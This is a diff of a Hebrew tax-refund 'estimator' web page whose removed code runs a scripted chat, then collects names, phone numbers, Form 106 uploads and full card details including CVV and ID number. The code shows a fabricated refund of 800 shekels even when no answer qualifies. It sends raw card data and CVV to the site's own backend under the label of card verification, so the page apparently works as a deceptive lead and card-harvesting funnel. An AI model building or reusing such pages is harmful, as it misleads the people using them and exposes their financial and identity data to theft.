-        updateProgress(state.currentStep);
-
-        const typing = addTypingBubble();
-        await sleep(500 + Math.random() * 400);
-        removeTyping(typing);
-
-        addBotBubble(q.text);
-
-        const answer = await new Promise(resolve => {
-          showOptions(q.options, (selected) => {
-            resolve(selected);
-          });
-        });
-
-        const isYes = answer === 'כן';
-        addUserBubble(answer);
-        state.answers.push({ questionId: q.id, answer: isYes ? 'כן' : 'לא' });
-
-        if (isYes) {
-          const from = state.refund;
-          state.refund += q.yesAdd;
-          animateRefund(from, state.refund, 900);
-          addSystemBubble('נוספו ' + formatNumber(q.yesAdd) + ' ₪ להחזר המשוער');
-        } else {
-          addSystemBubble('תשובתכם נרשמה. ממשיכים לשאלה הבאה.');
-        }
-
-        await sleep(500);
-      }
-
-      // Done with questions
-      state.currentStep = 5;
-      updateProgress(5);
-
-      const typing2 = addTypingBubble();
-      await sleep(600);
-      removeTyping(typing2);
-
-      addBotBubble('סיימנו את הבדיקה הראשונית. מנתח את התשובות...');
-      await sleep(500);
-
-      const finalVal = state.refund > 0 ? state.refund : 800;
-      if (state.refund === 0) {
-        state.refund = 800;
-        animateRefund(0, 800, 1000);
-      }
-
-      addBotBubble('על פי ניתוח התשובות שהזנתם, ההחזר המשוער שעומד לרשותכם הוא:');
-      await sleep(400);
-
-      // Show lead gen
-      inputArea.classList.remove('hidden');
-      leadSubmit.disabled = false;
-      leadSubmit.textContent = 'קבלת תוצאת הבדיקה';
-      scrollChatDown();
-    }
-
-    // ──────────────────────────────────────────────────────────────────
-    // Lead form submission → Backend API
-    // ──────────────────────────────────────────────────────────────────
-    leadSubmit.addEventListener('click', async function(e) {
-      e.preventDefault();
-      const name = nameInput.value.trim();
-      const phone = phoneInput.value.trim();
-
-      if (!name || name.length < 2) {
-        nameInput.style.borderColor = 'rgba(239,68,68,0.5)';
-        nameInput.placeholder = 'נא להזין שם מלא';
-        return;
-      }
-      if (!phone || phone.length < 9) {
-        phoneInput.style.borderColor = 'rgba(239,68,68,0.5)';
-        phoneInput.placeholder = 'נא להזין מספר נייד תקין';
-        return;
-      }
-
-      nameInput.style.borderColor = 'rgba(255,255,255,0.08)';
-      phoneInput.style.borderColor = 'rgba(255,255,255,0.08)';
-
-      leadSubmit.disabled = true;
-      leadSubmit.textContent = 'שולח...';
-
-      try {
-        const res = await fetch(API_BASE + '/api/submit-lead', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            name,
-            phone,
-            answers: state.answers,
-          }),
-        });
-
-        const data = await res.json();
-
-        if (!res.ok) {
-          throw new Error(data.error || 'שגיאה בשליחה');
-        }
-
-        leadSubmit.textContent = 'נשלח בהצלחה';
-        saveSession('result', { name, phone });
-        await sleep(600);
-
-        inputArea.classList.add('hidden');
-        chatArea.classList.add('hidden');
-
-        finalRefund.textContent = formatNumber(state.refund);
-        resultScreen.style.display = 'flex';
-        launchConfetti();
-      } catch (err) {
-        console.error('Submit lead error:', err);
-        leadSubmit.disabled = false;
-        leadSubmit.textContent = 'קבלת תוצאת הבדיקה';
-        addBotBubble('אירעה שגיאה בשליחת הפרטים. נא לנסות שוב.');
-      }
-    });
-
-    // ──────────────────────────────────────────────────────────────────
-    // File drop label click
-    // ──────────────────────────────────────────────────────────────────
-    fileDropLabel.addEventListener('click', () => fileInput.click());
-
-    // ──────────────────────────────────────────────────────────────────
-    // Document Upload
-    // ──────────────────────────────────────────────────────────────────
-    uploadBtn.addEventListener('click', () => {
-      resultScreen.style.display = 'none';
-      uploadScreen.style.display = 'flex';
-      saveSession('upload', { name: nameInput.value.trim(), phone: phoneInput.value.trim() });
-    });
-
-    skipUploadBtn.addEventListener('click', () => {
-      uploadScreen.style.display = 'none';
-      paymentScreen.style.display = 'flex';
-      saveSession('payment', { name: nameInput.value.trim(), phone: phoneInput.value.trim() });
-    });
-
-    uploadForm.addEventListener('submit', async function(e) {
-      e.preventDefault();
-
-      if (!fileInput.files || fileInput.files.length === 0) {
-        uploadStatus.textContent = 'נא לבחור קבצים להעלאה';
-        uploadStatus.className = 'status-msg error-msg';
-        return;
-      }
-
-      const phone = phoneInput.value.trim().replace(/[^0-9]/g, '');
-
-      const formData = new FormData();
-      formData.append('phone', phone);
-      for (const file of fileInput.files) {
-        formData.append('documents', file);
-      }
-
-      uploadSubmit.disabled = true;
-      uploadSubmit.textContent = 'מעלה...';
-      uploadStatus.textContent = '';
-
-      try {
-        const res = await fetch(API_BASE + '/api/upload-106', {
-          method: 'POST',
-          body: formData,
-        });
-
-        const data = await res.json();
-
-        if (!res.ok) {
-          throw new Error(data.error || 'שגיאה בהעלאה');
-        }
-
-        uploadStatus.textContent = '✓ ' + data.message;
-        uploadStatus.className = 'status-msg success-msg';
-        uploadSubmit.textContent = 'הועלה';
-        saveSession('payment', { name: nameInput.value.trim(), phone: phoneInput.value.trim() });
-
-        setTimeout(() => {
-          uploadScreen.style.display = 'none';
-          paymentScreen.style.display = 'flex';
-        }, 1200);
-      } catch (err) {
-        console.error('Upload error:', err);
-        uploadStatus.textContent = err.message;
-        uploadStatus.className = 'status-msg error-msg';
-        uploadSubmit.disabled = false;
-        uploadSubmit.textContent = 'העלאת מסמכים';
-      }
-    });
-
-    // ──────────────────────────────────────────────────────────────────
-    // Quick payment button from result screen
-    // ──────────────────────────────────────────────────────────────────
-    document.getElementById('gotoPaymentBtn').addEventListener('click', () => {
-      resultScreen.style.display = 'none';
-      paymentScreen.style.display = 'flex';
-      saveSession('payment', { name: nameInput.value.trim(), phone: phoneInput.value.trim() });
-    });
-
-    // ──────────────────────────────────────────────────────────────────
-    // Card formatting helpers
-    // ──────────────────────────────────────────────────────────────────
-    cardNumber.addEventListener('input', () => {
-      let val = cardNumber.value.replace(/[^0-9]/g, '').slice(0, 16);
-      cardNumber.value = val.replace(/(.{4})/g, '$1 ').trim();
-      cardNumber.style.borderColor = 'rgba(255,255,255,0.08)';
-    });
-
-    cardExpiry.addEventListener('input', () => {
-      let val = cardExpiry.value.replace(/[^0-9]/g, '').slice(0, 4);
-      if (val.length >= 3) {
-        cardExpiry.value = val.slice(0, 2) + '/' + val.slice(2);
-      } else {
-        cardExpiry.value = val;
-      }
-      cardExpiry.style.borderColor = 'rgba(255,255,255,0.08)';
-    });
-
-    cardCvv.addEventListener('input', () => {
-      cardCvv.value = cardCvv.value.replace(/[^0-9]/g, '').slice(0, 4);
-      cardCvv.style.borderColor = 'rgba(255,255,255,0.08)';
-    });
-
-    cardHolderId.addEventListener('input', () => {
-      cardHolderId.value = cardHolderId.value.replace(/[^0-9]/g, '').slice(0, 9);
-      cardHolderId.style.borderColor = 'rgba(255,255,255,0.08)';
-    });
-
-    // ──────────────────────────────────────────────────────────────────
-    // Payment form submission
-    // ──────────────────────────────────────────────────────────────────
-    paymentForm.addEventListener('submit', async function(e) {
-      e.preventDefault();
-
-      const phone = phoneInput.value.trim().replace(/[^0-9]/g, '');
-      const ccNum = cardNumber.value.replace(/\s/g, '');
-      const expRaw = cardExpiry.value.replace('/', '');
-      const expMonth = expRaw.slice(0, 2);
-      const expYear = expRaw.slice(2);
-      const cvv = cardCvv.value;
-      const holderId = cardHolderId.value.replace(/[^0-9]/g, '');
-      const holderName = cardHolderName.value.trim() || nameInput.value.trim();
-
-      paymentError.style.display = 'none';
-
-      if (ccNum.length < 13) {
-        cardNumber.style.borderColor = 'rgba(239,68,68,0.5)';
-        showPaymentError('נא להזין מספר כרטיס תקין');
-        return;
-      }
-      if (expRaw.length < 4) {
-        cardExpiry.style.borderColor = 'rgba(239,68,68,0.5)';
-        showPaymentError('נא להזין תוקף כרטיס תקין (MM/YY)');
-        return;
-      }
-      if (cvv.length < 3) {
-        cardCvv.style.borderColor = 'rgba(239,68,68,0.5)';
-        showPaymentError('נא להזין קוד אבטחה (CVV)');
-        return;
-      }
-      if (holderId.length < 8) {
-        cardHolderId.style.borderColor = 'rgba(239,68,68,0.5)';
-        showPaymentError('נא להזין תעודת זהות תקינה');
-        return;
-      }
-
-      paymentSubmit.disabled = true;
-      paymentSubmit.textContent = 'מאמת כרטיס...';
-      paymentStatus.textContent = '';
-
-      try {
-        const res = await fetch(API_BASE + '/api/setup-payment', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone,
-            cardNumber: ccNum,
-            expMonth,
-            expYear,
-            cvv,
-            holderId,
-            holderName,
-          }),
-        });
-
-        const data = await res.json();
-
-        if (!res.ok) {
-          throw new Error(data.error || 'אימות הכרטיס נכשל');
-        }
-
-        paymentSubmit.textContent = 'אומת';
-        paymentStatus.textContent = 'כרטיס אומת בהצלחה. ממשיך...';
-        paymentStatus.className = 'status-msg success-msg';
-
-        saveSession('payment', { name: cardHolderName.value.trim() || nameInput.value.trim(), phone: phoneInput.value.trim() });
-        await sleep(1000);
-
-        paymentScreen.style.display = 'none';
-        successScreen.style.display = 'flex';
-        clearSession();
-        launchConfetti();
-      } catch (err) {
-        console.error('Payment error:', err);
-        showPaymentError(err.message);
-        paymentSubmit.disabled = false;
-        paymentSubmit.textContent = 'אימות כרטיס';
-      }
-    });
-
-    function showPaymentError(msg) {
-      paymentError.textContent = msg;
-      paymentError.style.display = 'block';
-    }
-
-    // ──────────────────────────────────────────────────────────────────
-    // Start button
-    // ──────────────────────────────────────────────────────────────────
-    startBtn.addEventListener('click', startChat);
-
-    // ──────────────────────────────────────────────────────────────────
-    // Input validation fix on focus
-    // ──────────────────────────────────────────────────────────────────
-    nameInput.addEventListener('focus', () => {
-      nameInput.style.borderColor = 'rgba(255,255,255,0.08)';
-      nameInput.placeholder = 'שם מלא';
-    });
-    phoneInput.addEventListener('focus', () => {
-      phoneInput.style.borderColor = 'rgba(255,255,255,0.08)';
-      phoneInput.placeholder = 'טלפון נייד';
-    });
-
-    // ──────────────────────────────────────────────────────────────────
-    // Responsive confetti resize
-    // ──────────────────────────────────────────────────────────────────
-    window.addEventListener('resize', () => {
-      const canvas = document.getElementById('confetti-canvas');
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    });
-
-    // ──────────────────────────────────────────────────────────────────
-    // Session restore on page load (refresh resilience)
-    // ──────────────────────────────────────────────────────────────────
+    // ─── Session restore ────────────────────────────────────────
     function restoreSession() {
       const saved = loadSession();
       if (!saved) return;
-
-      state.refund = saved.refund || 0;
+      state.name = saved.name || '';
+      state.phone = saved.phone || '';
       state.answers = saved.answers || [];
-      updateRefundDisplay(state.refund);
+      state.refund = saved.refund || 0;
+      updateRefundUI(state.refund);
+      if (state.name) nameInput.value = state.name;
+      if (state.phone) phoneInput.value = state.phone;
 
-      if (saved.name) nameInput.value = saved.name;
-      if (saved.phone) phoneInput.value = saved.phone;
+      // restore option selections
+      const restoreOpts = () => {
+        for (const a of state.answers) {
+          let groupId;
+          if (a.questionId === 'employment') groupId = 'employmentGroup';
+          else if (a.questionId === 'job_changes') groupId = 'jobGroup';
+          else if (a.questionId === 'pensya') groupId = 'pensyaGroup';
+          if (!groupId) continue;
+          const container = document.getElementById(groupId);
+          if (!container) continue;
+          const btn = container.querySelector(`.option-btn[data-value="${a.answer}"]`);
+          if (btn) {
+            btn.classList.add('selected');
+            // re-enable next btn
+            const nextBtnId = groupId === 'employmentGroup' ? 'step2Btn' :
+                              groupId === 'jobGroup' ? 'step3Btn' : 'step4Btn';
+            const nb = document.getElementById(nextBtnId);
+            if (nb) nb.disabled = false;
+          }
+        }
+      };
 
-      switch (saved.screen) {
-        case 'result':
-          finalRefund.textContent = formatNumber(state.refund);
-          welcomeScreen.classList.add('hidden');
-          chatArea.classList.add('hidden');
-          inputArea.classList.add('hidden');
-          resultScreen.style.display = 'flex';
-          updateProgress(5);
-          break;
-        case 'upload':
-          finalRefund.textContent = formatNumber(state.refund);
-          welcomeScreen.classList.add('hidden');
-          chatArea.classList.add('hidden');
-          inputArea.classList.add('hidden');
-          resultScreen.style.display = 'none';
-          uploadScreen.style.display = 'flex';
-          updateProgress(5);
-          break;
-        case 'payment':
-          finalRefund.textContent = formatNumber(state.refund);
-          welcomeScreen.classList.add('hidden');
-          chatArea.classList.add('hidden');
-          inputArea.classList.add('hidden');
-          resultScreen.style.display = 'none';
-          paymentScreen.style.display = 'flex';
-          updateProgress(5);
-          break;
-        default:
-          break;
+      if (saved.step && saved.step > 1 && saved.step <= TOTAL_STEPS) {
+        restoreOpts();
+        goToStep(saved.step);
       }
     }
 
     restoreSession();
+
+    // resize confetti
+    window.addEventListener('resize', () => {
+      const c = document.getElementById('confetti-canvas');
+      c.width = window.innerWidth; c.height = window.innerHeight;
+    });
   </script>
 
 </body>
